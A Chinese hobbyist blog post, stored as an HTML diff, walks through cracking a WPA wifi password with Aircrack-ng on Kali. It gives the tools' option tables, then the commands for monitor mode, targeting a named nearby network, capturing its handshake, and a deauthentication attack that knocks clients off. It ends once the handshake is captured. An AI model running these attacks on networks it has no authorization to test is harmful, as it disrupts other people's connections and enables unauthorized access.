@@ -1,0 +1,1455 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="无线安全," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Xie sm's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="早就想折腾下wifi破解了，所以最近收了一个TL-WN722N，拿到手之后马上就是干，关于wifi破解网上教程一大片，我写这个也主要是为了记录下瞎折腾的过程，写的比较简单。">
+<meta name="keywords" content="无线安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Aircrack-ng破解wifi密码">
+<meta property="og:url" content="http://iholo.me/posts/9c06b015/index.html">
+<meta property="og:site_name" content="Xie sm&#39;s blog">
+<meta property="og:description" content="早就想折腾下wifi破解了，所以最近收了一个TL-WN722N，拿到手之后马上就是干，关于wifi破解网上教程一大片，我写这个也主要是为了记录下瞎折腾的过程，写的比较简单。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxux376pkj20k204g76r.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxuxeiuorj20mu0adq9o.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxuwvceq7j20mw05c41r.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxuxzbfxpj20mr0dptj7.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxuwpsnt1j20sz017gmf.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxuxrbjz1j20mm069wi4.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxuxhzfsqj20lg0buq8q.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxux049eoj20n905m0wa.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxuwxgm4gj20li024t9t.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxv2ksg4sj20ll03uwge.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxv3xtm05j20lo0c045z.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxv3bdm4gj20p10eogm8.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxv3ptuqqj20h90b0tgs.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxv44nj4tj20hb08vdmt.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxv3q7y6dj20hs0bbq89.jpg">
+<meta property="og:updated_time" content="2019-11-02T08:24:33.241Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Aircrack-ng破解wifi密码">
+<meta name="twitter:description" content="早就想折腾下wifi破解了，所以最近收了一个TL-WN722N，拿到手之后马上就是干，关于wifi破解网上教程一大片，我写这个也主要是为了记录下瞎折腾的过程，写的比较简单。">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxux376pkj20k204g76r.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://iholo.me/posts/9c06b015/"/>
+
+
+
+
+
+  <title>Aircrack-ng破解wifi密码 | Xie sm's blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?909bf32d828490a95a8dce76425e1c33";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Xie sm's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-fire"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-share">
+          <a href="/share/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-rocket"></i> <br />
+            
+            分享
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://iholo.me/posts/9c06b015/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Xie sm">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/7bf9f3e8gy1fpjlw6duhzj2046046a9x.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xie sm's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">Aircrack-ng破解wifi密码</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-04T19:48:54+00:00">
+                2018-08-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/posts/9c06b015/" class="leancloud_visitors" data-flag-title="Aircrack-ng破解wifi密码">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,823
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  9
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>早就想折腾下wifi破解了，所以最近收了一个TL-WN722N，拿到手之后马上就是干，关于wifi破解网上教程一大片，我写这个也主要是为了记录下瞎折腾的过程，写的比较简单。</p>
+<a id="more"></a>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol>
+<li><a href="https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-hyperv-image-download/" target="_blank" rel="noopener">kali 虚拟机</a></li>
+<li>TL-WN722N v1版本（<a href="http://www.freebuf.com/articles/wireless/140065.html" target="_blank" rel="noopener">可开启监听模式的无线网卡</a> )</li>
+</ol>
+<h3 id="Aircrack-ng介绍"><a href="#Aircrack-ng介绍" class="headerlink" title="Aircrack-ng介绍"></a>Aircrack-ng介绍</h3><p>​    <a href="https://www.aircrack-ng.org/" target="_blank" rel="noopener">Aircrack-ng</a> (是无线渗透的利器,主要功能有：网络侦测，数据包嗅探，WEP和WPA/WPA2-PSK破解,其可以工作在任何支持监听模式的无线网卡上并嗅探802.11a，802.11b，802.11g的数据。该程序可运行在Linux和Windows上。</p>
+<h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><table>
+<thead>
+<tr>
+<th>Name</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>aircrack-ng</td>
+<td>破解WEP以及WPA（字典攻击）密钥</td>
+</tr>
+<tr>
+<td>airdecap-ng</td>
+<td>通过已知密钥来解密WEP或WPA嗅探数据</td>
+</tr>
+<tr>
+<td>airmon-ng</td>
+<td>将网卡设定为监听模式</td>
+</tr>
+<tr>
+<td>aireplay-ng</td>
+<td>数据包注入工具（Linux和Windows使用CommView驱动程序）</td>
+</tr>
+<tr>
+<td>airodump-ng</td>
+<td>数据包嗅探：将无线网络数据输送到PCAP或IVS文件并显示网络信息</td>
+</tr>
+<tr>
+<td>airtun-ng</td>
+<td>创建虚拟管道</td>
+</tr>
+<tr>
+<td>airolib-ng</td>
+<td>保存、管理ESSID密码列表</td>
+</tr>
+<tr>
+<td>packetforge-ng</td>
+<td>创建数据包注入用的加密包。</td>
+</tr>
+<tr>
+<td>Tools</td>
+<td>混合、转换工具</td>
+</tr>
+<tr>
+<td>airbase-ng</td>
+<td>软件模拟AP</td>
+</tr>
+<tr>
+<td>airdecloak-ng</td>
+<td>消除pcap文件中的WEP加密</td>
+</tr>
+<tr>
+<td>airdriver-ng</td>
+<td>无线设备驱动管理工具</td>
+</tr>
+<tr>
+<td>airolib-ng</td>
+<td>保存、管理ESSID密码列表，计算对应的密钥</td>
+</tr>
+<tr>
+<td>airserv-ng</td>
+<td>允许不同的进程访问无线网卡</td>
+</tr>
+<tr>
+<td>buddy-ng</td>
+<td>easside-ng的文件描述</td>
+</tr>
+<tr>
+<td>easside-ng</td>
+<td>和AP接入点通讯（无WEP）</td>
+</tr>
+<tr>
+<td>tkiptun-ng</td>
+<td>WPA/TKIP攻击</td>
+</tr>
+<tr>
+<td>wesside-ng</td>
+<td>自动破解WEP密钥</td>
+</tr>
+</tbody>
+</table>
+<h3 id="简单教程"><a href="#简单教程" class="headerlink" title="简单教程"></a>简单教程</h3><h4 id="airodump-ng-命令"><a href="#airodump-ng-命令" class="headerlink" title="airodump-ng 命令"></a><a href="https://www.aircrack-ng.org/doku.php?id=airodump-ng" target="_blank" rel="noopener">airodump-ng </a>命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">usage: airodump-ng &lt;options&gt; &lt;interface&gt;[,&lt;interface&gt;,...]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">    --ivs                 : Save only captured IVs</span><br><span class="line">    --gpsd                : Use GPSd</span><br><span class="line">    --write      &lt;prefix&gt; : Dump file prefix</span><br><span class="line">    -w                    : same as --write</span><br><span class="line">    --beacons             : Record all beacons <span class="keyword">in</span> dump file</span><br><span class="line">    --update       &lt;secs&gt; : Display update delay <span class="keyword">in</span> seconds</span><br><span class="line">    --showack             : Prints ack/cts/rts statistics</span><br><span class="line">    -h                    : Hides known stations <span class="keyword">for</span> --showack</span><br><span class="line">    -f            &lt;msecs&gt; : Time <span class="keyword">in</span> ms between hopping channels</span><br><span class="line">    --berlin       &lt;secs&gt; : Time before removing the AP/client</span><br><span class="line">                            from the screen when no more packets</span><br><span class="line">                            are received (Default: 120 seconds)</span><br><span class="line">    -r             &lt;file&gt; : Read packets from that file</span><br><span class="line">    -x            &lt;msecs&gt; : Active Scanning Simulation</span><br><span class="line">    --manufacturer        : Display manufacturer from IEEE OUI list</span><br><span class="line">    --uptime              : Display AP Uptime from Beacon Timestamp</span><br><span class="line">    --wps                 : Display WPS information (<span class="keyword">if</span> any)</span><br><span class="line">    --output-format</span><br><span class="line">                &lt;formats&gt; : Output format. Possible values:</span><br><span class="line">                            pcap, ivs, csv, gps, kismet, netxml</span><br><span class="line">                            Short format <span class="string">"-o"</span></span><br><span class="line">                            The option can be specified multiple <span class="built_in">times</span>.  In this <span class="keyword">case</span>, each file format</span><br><span class="line">                            specified will be output.  Only ivs or pcap can be used, not both.  </span><br><span class="line">    --ignore-negative-one : Removes the message that says</span><br><span class="line">                            fixed channel &lt;interface&gt;: -1</span><br><span class="line">    --write-interval</span><br><span class="line">                &lt;seconds&gt; : Output file(s) write interval <span class="keyword">in</span> seconds</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Filter options:</span><br><span class="line">    --encrypt   &lt;suite&gt;   : Filter APs by cipher suite</span><br><span class="line">    --netmask &lt;netmask&gt;   : Filter APs by mask</span><br><span class="line">    --bssid     &lt;bssid&gt;   : Filter APs by BSSID</span><br><span class="line">    --essid     &lt;essid&gt;   : Filter APs by ESSID</span><br><span class="line">    --essid-regex &lt;regex&gt; : Filter APs by ESSID using a regular</span><br><span class="line">                            expression</span><br><span class="line">    -a                    : Filter unassociated clients</span><br><span class="line"></span><br><span class="line">By default, airodump-ng hop on 2.4GHz channels.</span><br><span class="line">You can make it capture on other/specific channel(s) by using:</span><br><span class="line">    --ht20                : Set channel to HT20 (802.11n)</span><br><span class="line">    --ht40-               : Set channel to HT40- (802.11n)</span><br><span class="line">    --ht40+               : Set channel to HT40+ (802.11n)</span><br><span class="line">    --channel &lt;channels&gt;  : Capture on specific channels</span><br><span class="line">    --band &lt;abg&gt;          : Band on <span class="built_in">which</span> airodump-ng should hop</span><br><span class="line">    -C    &lt;frequencies&gt;   : Uses these frequencies <span class="keyword">in</span> MHz to hop</span><br><span class="line">    --cswitch  &lt;method&gt;   : Set channel switching method</span><br><span class="line">                  0       : FIFO (default)</span><br><span class="line">                  1       : Round Robin</span><br><span class="line">                  2       : Hop on last</span><br><span class="line">    -s                    : same as --cswitch</span><br><span class="line"></span><br><span class="line">    --<span class="built_in">help</span>                : Displays this usage screen</span><br></pre></td></tr></table></figure>
+<h4 id="aircrack-ng命令"><a href="#aircrack-ng命令" class="headerlink" title="aircrack-ng命令"></a><a href="https://www.aircrack-ng.org/doku.php?id=aircrack-ng" target="_blank" rel="noopener">aircrack-ng</a>命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng [options] &lt;capture file(s)&gt;</span><br></pre></td></tr></table></figure>
+<p>Common options</p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Param.</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-a</td>
+<td>amode</td>
+<td>Force attack mode (1 = static WEP, 2 = WPA/WPA2-PSK)</td>
+</tr>
+<tr>
+<td>-e</td>
+<td>essid</td>
+<td>If set, all IVs from networks with the same ESSID will be used. This option is also required for WPA/WPA2-PSK cracking if the ESSID is not broadcasted (hidden)</td>
+</tr>
+<tr>
+<td>-b</td>
+<td>bssid</td>
+<td>Long version -<code></code>-bssid. Select the target network based on the access point’s MAC address</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>nbcpu</td>
+<td>On SMP systems: # of CPU to use. This option is invalid on non-SMP systems</td>
+</tr>
+<tr>
+<td>-q</td>
+<td><em>none</em></td>
+<td>Enable quiet mode (no status output until the key is found, or not)</td>
+</tr>
+<tr>
+<td>-C</td>
+<td>MACs</td>
+<td>Long version -<code></code>-combine. Merge the given APs (separated by a comma) into virtual one</td>
+</tr>
+<tr>
+<td>-l</td>
+<td>file name</td>
+<td>(Lowercase L, ell) logs the key to the file specified. Overwrites the file if it already exists</td>
+</tr>
+</tbody>
+</table>
+<p>Static WEP cracking options</p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Param.</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-c</td>
+<td><em>none</em></td>
+<td>Restrict the search space to alpha-numeric characters only (0x20 - 0x7F)</td>
+</tr>
+<tr>
+<td>-t</td>
+<td><em>none</em></td>
+<td>Restrict the search space to binary coded decimal hex characters</td>
+</tr>
+<tr>
+<td>-h</td>
+<td><em>none</em></td>
+<td>Restrict the search space to numeric characters (0x30-0x39) These keys are used by default in most Fritz!BOXes</td>
+</tr>
+<tr>
+<td>-d</td>
+<td>start</td>
+<td>Long version -<code></code>-debug. Set the beginning of the WEP key (in hex), for debugging purposes</td>
+</tr>
+<tr>
+<td>-m</td>
+<td>maddr</td>
+<td>MAC address to filter WEP data packets. Alternatively, specify -m ff:ff:ff:ff:ff:ff to use all and every IVs, regardless of the network</td>
+</tr>
+<tr>
+<td>-n</td>
+<td>nbits</td>
+<td>Specify the length of the key: 64 for 40-bit WEP, 128 for 104-bit WEP, etc. The default value is 128</td>
+</tr>
+<tr>
+<td>-i</td>
+<td>index</td>
+<td>Only keep the IVs that have this key index (1 to 4). The default behaviour is to ignore the key index</td>
+</tr>
+<tr>
+<td>-f</td>
+<td>fudge</td>
+<td>By default, this parameter is set to 2 for 104-bit WEP and to 5 for 40-bit WEP. Specify a higher value to increase the bruteforce level: cracking will take more time, but with a higher likelyhood of success</td>
+</tr>
+<tr>
+<td>-k</td>
+<td>korek</td>
+<td>There are 17 korek statistical attacks. Sometimes one attack creates a huge false positive that prevents the key from being found, even with lots of IVs. Try -k 1, -k 2, … -k 17 to disable each attack selectively</td>
+</tr>
+<tr>
+<td>-x/-x0</td>
+<td><em>none</em></td>
+<td>Disable last keybytes brutforce</td>
+</tr>
+<tr>
+<td>-x1</td>
+<td><em>none</em></td>
+<td>Enable last keybyte bruteforcing (default)</td>
+</tr>
+<tr>
+<td>-x2</td>
+<td><em>none</em></td>
+<td>Enable last two keybytes bruteforcing</td>
+</tr>
+<tr>
+<td>-X</td>
+<td><em>none</em></td>
+<td>Disable bruteforce multithreading (SMP only)</td>
+</tr>
+<tr>
+<td>-s</td>
+<td><em>none</em></td>
+<td>Show the key in ASCII while cracking</td>
+</tr>
+<tr>
+<td>-y</td>
+<td><em>none</em></td>
+<td>Experimental single bruteforce attack which should only be used when the standard attack mode fails with more than one million IVs</td>
+</tr>
+<tr>
+<td>-z</td>
+<td><em>none</em></td>
+<td>Invokes the PTW WEP cracking method (Default in v1.x)</td>
+</tr>
+<tr>
+<td>-P</td>
+<td>number</td>
+<td>Long version -<code></code>-ptw-debug. Invokes the PTW debug mode: 1 Disable klein, 2 PTW.</td>
+</tr>
+<tr>
+<td>-K</td>
+<td><em>none</em></td>
+<td>Invokes the Korek WEP cracking method. (Default in v0.x)</td>
+</tr>
+<tr>
+<td>-D</td>
+<td><em>none</em></td>
+<td>Long version -<code></code>-wep-decloak. Run in WEP decloak mode</td>
+</tr>
+<tr>
+<td>-1</td>
+<td><em>none</em></td>
+<td>Long version -<code></code>-oneshot. Run only 1 try to crack key with PTW</td>
+</tr>
+<tr>
+<td>-M</td>
+<td>number</td>
+<td>(WEP cracking) Specify the maximum number of IVs to use</td>
+</tr>
+<tr>
+<td>-V</td>
+<td><em>none</em></td>
+<td>Long version -<code></code>-visual-inspection. Run in visual inspection mode (only with KoreK)</td>
+</tr>
+</tbody>
+</table>
+<p>WEP and WPA-PSK cracking options</p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Param.</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-w</td>
+<td>words</td>
+<td>Path to a wordlists or “-” without the quotes for standard in (stdin). Separate multiple wordlists by comma</td>
+</tr>
+<tr>
+<td>-N</td>
+<td>file</td>
+<td>Create a new cracking session and save it to the specified file</td>
+</tr>
+<tr>
+<td>-R</td>
+<td>file</td>
+<td>Restore cracking session from the specified file</td>
+</tr>
+</tbody>
+</table>
+<p>WPA-PSK options</p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Param.</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-E</td>
+<td>file&gt;</td>
+<td>Create EWSA Project file v3</td>
+</tr>
+<tr>
+<td>-j</td>
+<td>file</td>
+<td>Create Hashcat v3.6+ Capture file (HCCAPX)</td>
+</tr>
+<tr>
+<td>-J</td>
+<td>file</td>
+<td>Create Hashcat Capture file</td>
+</tr>
+<tr>
+<td>-S</td>
+<td><em>none</em></td>
+<td>WPA cracking speed test</td>
+</tr>
+<tr>
+<td>-Z</td>
+<td>sec</td>
+<td>WPA cracking speed test execution length in seconds</td>
+</tr>
+<tr>
+<td>-r</td>
+<td>database</td>
+<td>Utilizes a database generated by <a href="https://www.aircrack-ng.org/doku.php?id=airolib-ng" target="_blank" rel="noopener">airolib-ng</a> as input to determine the WPA key. Outputs an error message if aircrack-ng has not been compiled with sqlite support</td>
+</tr>
+</tbody>
+</table>
+<p>SIMD Selection</p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Param.</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-<code></code>-simd</td>
+<td>optimization</td>
+<td>Use user-specified SIMD optimization instead of the fastest one</td>
+</tr>
+<tr>
+<td>-<code></code>-simd-list</td>
+<td><em>none</em></td>
+<td>Shows a list of the SIMD optimizations available</td>
+</tr>
+</tbody>
+</table>
+<p>Other options</p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Param.</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-H</td>
+<td><em>none</em></td>
+<td>Long version -<code></code>-help. Output help information</td>
+</tr>
+<tr>
+<td>-u</td>
+<td><em>none</em></td>
+<td>Long form -<code></code>-cpu-detect. Provide information on the number of CPUs and features available such as MMX, SSE2, AVX, AVX2, AVX512</td>
+</tr>
+</tbody>
+</table>
+<h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>1.加载usb无线网卡并开启监听模式</p>
+<p><img src="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxux376pkj20k204g76r.jpg" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig wlan0 up</span><br><span class="line">sudo airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxuxeiuorj20mu0adq9o.jpg" alt="screenshot_20180804_170955"></p>
+<p>可以看到已经开启了监听模式，输入以下命令也可以看到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iwconfig</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxuwvceq7j20mw05c41r.jpg" alt=""></p>
+<p>2.查看周边wifi情况,选择目标wifi</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airodumo-ng wlan0mon</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxuxzbfxpj20mr0dptj7.jpg" alt=""></p>
+<h2 id="抓取"><a href="#抓取" class="headerlink" title="抓取"></a>抓取</h2><p>现在开始抓握手包，以上图第一个WIFI(YXGY41403)为目标</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airodump-ng --ignore-negative-one -w ./403.cap -c 10 --bssid 00:4B:F3:15:3D:D0 wlan0mon</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxuwpsnt1j20sz017gmf.jpg" alt=""></p>
+<p><img src="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxuxrbjz1j20mm069wi4.jpg" alt=""></p>
+<p>可以看到已经在监听了，为了顺利抓到握手包，我们需要使用DEAUTH攻击使已经连接的客户端断开并重新连接，以产生握手包。（注意：抓握手包破解必须有合法的客户端才行）攻击命令如下： </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo aireplay-ng -0 11 -a 00:4B:F3:15:3D:D0 -x 100 wlan0mon</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxuxhzfsqj20lg0buq8q.jpg" alt=""></p>
+<p>如果抓到握手包 界面会有提示 WPA handshake（如下图红色标识）此时可停止抓包。</p>
+<p><img src="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxux049eoj20n905m0wa.jpg" alt=""></p>
+<p><img src="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxuwxgm4gj20li024t9t.jpg" alt=""></p>
